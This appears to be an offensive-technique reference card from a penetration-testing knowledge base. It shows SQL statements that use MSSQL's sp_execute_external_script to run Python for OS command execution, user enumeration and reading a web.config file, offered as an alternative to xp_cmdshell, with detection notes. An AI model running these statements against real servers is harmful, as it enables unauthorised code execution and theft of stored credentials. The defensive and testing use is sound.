---
id: 23144886-fc44-4b04-bd8b-37568fdbbab0
type: code
name: MSSQL-Execute-Python-via-sp-execute-external-script
language: sql
verified: true
created_at: '2023-04-06T03:56:33.953556+00:00'
updated_at: '2023-04-10T20:22:46.088423+00:00'
platforms:
  - Windows
tags:
  - mssql
  - python-execution
validated: true
---

# MSSQL-Execute-Python-via-sp-execute-external-script

## Code

```sql
#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

## Description

Series of SQL statements using sp_execute_external_script to run Python code for user enumeration, OS command execution, file reading, and version checking within MSSQL.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| @script | Python code snippet | 'import os; os.system("whoami")' |
| File path | Path to read (in open()) | 'C:\\path\\to\\file.txt' |

## Usage

Execute in MSSQL shell where external scripts are enabled. Serves as an alternative to xp_cmdshell for code execution in restricted environments.

## Detection

- SQL logs for sp_execute_external_script calls.
- Python runtime logs or process monitoring for os.system spawns.
- File access audits on sensitive paths like web.config.

## Related

- [[procedures/MSSQL-Command-Execution-via-xp-cmdshell]]
